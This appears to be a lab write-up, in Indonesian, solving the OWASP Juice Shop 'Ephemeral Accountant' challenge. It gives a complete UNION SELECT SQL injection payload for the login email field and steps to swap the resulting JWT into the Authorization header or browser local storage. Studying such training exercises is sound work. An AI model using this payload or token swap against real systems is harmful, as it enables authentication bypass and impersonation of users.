# Ephemeral Accountant

## Objective
Log in with the (non-existing) accountant acc0unt4nt@juice-sh.op without ever registering that user.

## Langkah Eksploitasi
1. Lakukan login menggunakan email dan password bebas, capture menggunakan burpsuite.
<img width="1440" height="900" alt="Screenshot 2025-09-09 at 22 11 52" src="https://github.com/user-attachments/assets/95bfe094-b993-4881-ac8b-2b7c5b034224" />
2. Ubah bagian email dan password dengan

```bash
{
  "email": "' UNION SELECT * FROM (SELECT 20 AS `id`, 'acc0unt4nt@juice-sh.op' AS `username`, 'acc0unt4nt@juice-sh.op' AS `email`, 'test1234' AS `password`, 'accounting' AS `role`, '123' AS `deluxeToken`, '1.2.3.4' AS `lastLoginIp`, '/assets/public/images/uploads/default.svg' AS `profileImage`, '' AS `totpSecret`, 1 AS `isActive`, 12983283 AS `createdAt`, 133424 AS `updatedAt`, NULL AS `deletedAt`) AS tmp WHERE '1'='1';--",
  "password": "test1234"
}
```

3. Setelah request dikirim, server merespons dengan JWT token valid. Ini membuktikan bahwa aplikasi menerima user palsu sebagai akun sah.
<img width="1440" height="900" alt="Screenshot 2025-09-09 at 22 12 59" src="https://github.com/user-attachments/assets/4aefed26-52ad-4491-8f1d-56c077549ed4" />
4. Untuk benar-benar masuk sebagai accountant, token harus diganti dengan token hasil injection. Ada 2 cara:

- Di Burp Suite – intercept request setelah login, ganti header Authorization: Bearer <token>.
<img width="1440" height="900" alt="Screenshot 2025-09-09 at 22 35 22" src="https://github.com/user-attachments/assets/44202703-d67f-4476-bb70-6461d89b071e" />

- Di Browser – buka DevTools > Application > Local Storage > token, lalu ganti dengan token hasil injection.
<img width="1440" height="900" alt="Screenshot 2025-09-09 at 23 10 49" src="https://github.com/user-attachments/assets/0cc65957-35e3-40bb-912c-f51246dc74d3" />

5. Setelah token diganti, refresh halaman → user berhasil login sebagai accountant.

## Catatan
- Hasil: Berhasil.
- Alasan: Payload SQL Injection berhasil membentuk record user palsu yang memenuhi struktur tabel Users. Aplikasi tidak melakukan validasi ekstra untuk mengecek apakah akun benar-benar ada di database, sehingga JWT token bisa dikeluarkan.
- Refleksi:
  - Awalnya cukup tricky karena harus memastikan jumlah dan urutan kolom di UNION SELECT sesuai dengan struktur tabel Users. Jika tidak sesuai, hasilnya gagal dengan error SQL.
  - Dengan pendekatan ini, user ephemeral hanya “ada” selama query berjalan — tidak disimpan permanen di database.
  - Dari sisi keamanan, kasus ini menunjukkan betapa pentingnya prepared statements dan validasi server-side sebelum mengeluarkan token authentication.
